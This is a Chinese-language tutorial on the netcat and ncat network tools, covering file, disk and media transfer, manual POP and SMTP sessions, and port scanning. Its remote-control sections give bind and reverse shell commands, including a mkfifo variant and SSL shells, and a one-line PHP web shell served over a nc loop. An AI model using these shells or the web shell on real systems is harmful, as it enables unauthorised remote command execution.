# NC 与 NCAT



## 0x01 NC(NETCAT)

### 功能:
>
> 1. 分侦听传输模式,传输数据
>
> 2. telnet / 获取banner信息
>
> 3. 传输文本信息
>
> 4. 传输文件目录
>
> 5. 加密传输文件
>
> 6. 远程控制/木马
>
> 7. 流媒体服务器
>
> 8. 远程克隆硬盘
>
>    ​

### 基本方式(`nc -h`):

#### 帮助

> ```bash
> root:~# nc -h               //它的基本用法
> [v1.10-41.1]
> connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
> listen for inbound:	nc -l -p port [-options] [hostname] [port]
> options:
> 	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
> 	-e filename		program to exec after connect [dangerous!!]
> 	-b			allow broadcasts
> 	-g gateway		source-routing hop point[s], up to 8
> 	-G num			source-routing pointer: 4, 8, 12, ...
> 	-h			this cruft
> 	-i secs			delay interval for lines sent, ports scanned
>         -k                      set keepalive option on socket
> 	-l			listen mode, for inbound connects
> 	-n			numeric-only IP addresses, no DNS
> 	-o file			hex dump of traffic
> 	-p port			local port number
> 	-r			randomize local and remote ports
> 	-q secs			quit after EOF on stdin and delay of secs
> 	-s addr			local source address
> 	-T tos			set Type Of Service
> 	-t			answer TELNET negotiation
> 	-u			UDP mode
> 	-v			verbose [use twice to be more verbose]
> 	-w secs			timeout for connects and final net reads
> 	-C			Send CRLF as line-ending
> 	-z			zero-I/O mode [used for scanning]  #仅有的扫描参数
> port numbers can be individual or ranges: lo-hi [inclusive];
> hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
>
> Remote port number can also be specified as range. Example: '1-1024'
> ```
> **注意**
不同平台甚至不同linux版本的nc可能稍有差别,曾遇到Ubuntu的一些版本连`-p`参数都用不了的,只能`nc -l port`不能,`nc -lp port` .

#### 文件及目录传输

>    ```bash
>    # 传输文本, 可以聊天.
>    A: nc -lp 端口  #监听端
>    B: nc -nv ip 端口  	#主动连接端
>
>    # 文件传输
>    nc -lp 端口 > output.file  # 这里也可以通过管道发到文件处理程序,如视频播发器mpv
>    cat file > nc -nv ip 端口 -q 1 # 也可以形如: ps aux | nc -nv 10.1.1.12 port -q 1
>
>    # 传输硬盘信息,常用去取证,整个盘或分区完整复制
>    A: nc -lp 端口 | dd of=/dev/sda
>    B: dd if=/dev/sda | nc -nv ip 端口 -q 1  #传输结束后,一秒后退出
>
>    # 流媒体应用
>    A: nc -lp port > 1.mp4
>    B: nc -nv ip. port < 1.mp4 - q 1
>            或
>    A: nc -q -lp port < a.mp4
>    B: nc -nv ip port > 2.mp4
>
>    # NC-----流媒体服务
>    A: cat 1.mp4 | nc -lp port
>    B: nc -nv ip port | mplayer -vo x11 -cache 3000 -
>    或(nc -nv ip port | mpv)等等
>
>    # 传输目录(通过通过文件变相传输目录)
>    A: tar -cvf - music/ | nc -lp port - q 1
>    B: nc -nv ip port | tar -xvf -
>
>    # 变相加密传文件,但传输工程的过程是不加密的.
>    A: nc -lp port | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > filename          文件解密,需输入解密密码
>    B:  mcrypt --flush -Fbq -a rijndael-256 -m ecb < filename | nc -nv ip port -q 1     文件加密,需输入两次密码
>    ```

#### 用于登录(Telnet,  stmp 等)

>    ```bash
>    # 登录pop,如:
>    root:~# nc -vn 123.125.50.29 110
>    USER
>    USER 12asdfg  
>    USER ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==
>    # 登录stmp, 如:
>    root:~# ping smtp.163.com
>
>    root:~# nc -nv 123.125.20.138 25
>    220 163.com Anti-spam GT for Coremail System(163com[20141201])
>    ehlo
>    500 Errot: bad syntax
>    ehlo yuanfh
>    250-mail
>    250-PIPELINING
>    250-AUTH LOGIN PLAIN
>    250-AUTH=LOGIN PLAIN
>    250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj
>    250-ARARTTLS
>    250 8BIMIME
>    AUTH LOGIN
>    344 dxNLcm5hbWU6
>    <fanghong.yuan@163.com>
>    535 Error: authentication failed
>
>    root:~# nc -nv ip 80
>    ```

#### 端口扫描

>    ```bash
>    NC-----端口扫描, 结果不是太准
>    nc -nvz ip 1-65536
>    nc -vnzu ip 1-1024
>    ```


#### 远程控制 (版本不同可能没有-c参数, kali的nc版本有,而Ubuntu的则没有)

```bash

 NC-----远程控制
 正向：
 A: nc  -lp 333 -c  bash		# 被攻击者没有-c参数的nc版本,可以这样变形      
 A: mkfifo /tmp/pipe; sh /tmp/pipe | nc -nklp 4444 > /tmp/pipe
 B: nc  ip 333
 反向：
 A: nc -lp 333 	# 攻击者
 B: nc ip 333 -c bash

 注：Windows用户把bash改成cmd;
 
```


####  做一个简单的web服务器

> 先在一个文件写入内容
> cmd.php

```
HTTP/1.1 200 OK
Date: Fri, 16 Feb 2018 10:20:27 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html

<?php echo shell_exec($_GET['cmd']);?>
```

> 
> 再执行`while true; do nc -lp 80 -q 1 < cmd.php; done`
> 这样就可以构造`http://ip?cmd=comamd`执行指令




## 0x02 NCAT

> 功能上和nc基本相同,是nmap的一个功能组件.可以当做一个独立的工具使用. 与nc的一点重要差别是nc是明文传输,而且无法对连接者做控制,而netcat加密传输,并且可以限制连接者.
>
> 举例:
>
> ```shell
>  正向shell
>  A: ncat -c bash --allow ip -vnl port --ssl
>  B: ncat -nv ip port --ssl
>  
>  反向shell
>  A: ncat -lp port --ssl --allow 127.0.0.1
>  B: ncat -nv ip port -c bash --ssl
>   
>  #ncat -h
>   Usage: ncat [options] [hostname] [port]
>
> Options taking a time assume seconds. Append 'ms' for milliseconds,
> 's' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).
>   -4                         Use IPv4 only
>   -6                         Use IPv6 only
>   -U, --unixsock             Use Unix domain sockets only
>   -C, --crlf                 Use CRLF for EOL sequence
>   -c, --sh-exec <command>    Executes the given command via /bin/sh
>   -e, --exec <command>       Executes the given command
>       --lua-exec <filename>  Executes the given Lua script
>   -g hop1[,hop2,...]         Loose source routing hop points (8 max)
>   -G <n>                     Loose source routing hop pointer (4, 8, 12, ...)
>   -m, --max-conns <n>        Maximum <n> simultaneous connections
>   -h, --help                 Display this help screen
>   -d, --delay <time>         Wait between read/writes
>   -o, --output <filename>    Dump session data to a file
>   -x, --hex-dump <filename>  Dump session data as hex to a file
>   -i, --idle-timeout <time>  Idle read/write timeout
>   -p, --source-port port     Specify source port to use
>   -s, --source addr          Specify source address to use (doesn't affect -l)
>   -l, --listen               Bind and listen for incoming connections
>   -k, --keep-open            Accept multiple connections in listen mode
>   -n, --nodns                Do not resolve hostnames via DNS
>   -t, --telnet               Answer Telnet negotiations
>   -u, --udp                  Use UDP instead of default TCP
>       --sctp                 Use SCTP instead of default TCP
>   -v, --verbose              Set verbosity level (can be used several times)
>   -w, --wait <time>          Connect timeout
>   -z                         Zero-I/O mode, report connection status only
>       --append-output        Append rather than clobber specified output files
>       --send-only            Only send data, ignoring received; quit on EOF
>       --recv-only            Only receive data, never send anything
>       --allow                Allow only given hosts to connect to Ncat
>       --allowfile            A file of hosts allowed to connect to Ncat
>       --deny                 Deny given hosts from connecting to Ncat
>       --denyfile             A file of hosts denied from connecting to Ncat
>       --broker               Enable Ncat's connection brokering mode
>       --chat                 Start a simple Ncat chat server
>       --proxy <addr[:port]>  Specify address of host to proxy through
>       --proxy-type <type>    Specify proxy type ("http" or "socks4" or "socks5")
>       --proxy-auth <auth>    Authenticate with HTTP or SOCKS proxy server
>       --ssl                  Connect or listen with SSL
>       --ssl-cert             Specify SSL certificate file (PEM) for listening
>       --ssl-key              Specify SSL private key (PEM) for listening
>       --ssl-verify           Verify trust and domain name of certificates
>       --ssl-trustfile        PEM file containing trusted SSL certificates
>       --ssl-ciphers          Cipherlist containing SSL ciphers to use
>       --ssl-alpn             ALPN protocol list to use.
>       --version              Display Ncat's version information and exit
> ```
